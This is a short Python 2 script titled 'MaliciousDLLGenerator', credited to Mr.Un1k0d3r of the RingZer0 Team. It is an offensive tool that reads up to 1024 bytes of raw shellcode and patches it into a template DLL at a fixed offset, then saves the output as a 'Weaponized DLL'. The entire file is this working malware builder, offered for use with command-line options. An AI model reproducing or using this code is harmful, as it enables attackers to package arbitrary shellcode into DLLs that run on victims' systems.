import os
import sys
import argparse

class UI:

	@staticmethod
	def error(error, die=False):
		print "\n\033[31m[-] %s\033[00m" % error
		if die:
			os._exit(0)

	@staticmethod
	def success(message):
		print "\033[32m[+] %s\033[00m" % message

	@staticmethod
	def warn(message):
		print "\033[33m[*] %s\033[00m" % message

	@staticmethod
	def banner():
		print "\nMaliciousDLLGenerator - Mr.Un1k0d3r - RingZer0 Team\n---------------------------------------------------\n"
		
class Encoder:
	
	def __init__(self):
		pass
		
class FileUtil:

	@staticmethod
	def ReadFile(path):
		FileUtil.FileExists(path)
		return open(path, "rb").read()
	
	@staticmethod
	def FileExists(path):
		if os.path.exists(path):
			return True
			
		UI.error('%s not found' % path, True)
		
		
if __name__ == "__main__":
	UI.banner()
	UI.error("Shellcode size is limited to 1024 bytes")
	parser = argparse.ArgumentParser()
	parser.add_argument("-o", "--output", type=str, help="Output filename", required=True)
	parser.add_argument("-s", "--shellcode", type=str, help="Raw shellcode file path", required=True)
	parser.add_argument("-t", "--type", type=str, help="DLL type (default,oart)", default="default")
	args = parser.parse_args()
	
	dlls = {}
	dlls["default"] = 0x2200
	dlls["oart"] = 0x2200
	
	if dlls.has_key(args.type): 
		dll_path = "templates/%s.dll" % args.type
		dll_data = FileUtil.ReadFile(dll_path)
		UI.success("Loading %s" % dll_path)
		
		shellcode = FileUtil.ReadFile(args.shellcode)
		if len(shellcode) > 1024:
			UI.error("Your shellcode is bigger than 1024 bytes", True)
			
		UI.success("Loading shellcode file %s. Shellcode length %s (%d) bytes" % (args.shellcode, hex(len(shellcode)), len(shellcode)))
		output = dll_data[:int(dlls[args.type])] + shellcode + "\x00" * (1024 - len(shellcode)) + dll_data[int(dlls[args.type]) + 1024:]
		open(args.output, "wb").write(output)
		
		UI.success("\"%s\" Weaponized DLL was saved" % args.output)
	else:
		UI.error("Invalid DLL type")
